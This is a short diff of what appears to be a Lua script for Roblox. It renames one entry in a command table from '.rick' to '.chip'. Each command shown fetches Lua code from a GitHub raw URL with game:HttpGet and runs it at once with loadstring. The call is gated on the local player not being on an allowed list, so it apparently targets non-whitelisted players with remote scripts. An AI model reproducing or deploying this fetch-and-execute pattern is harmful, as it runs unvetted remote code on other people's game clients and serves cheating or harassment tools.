@@ -10599,7 +10599,7 @@ local commands = {
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/ProReleased/ProReleased/main/Rick"))()
 		end
 	end,
-	[".rick"] = function()
+	[".chip"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/ProReleased/ProReleased/main/Chip"))()
 		end
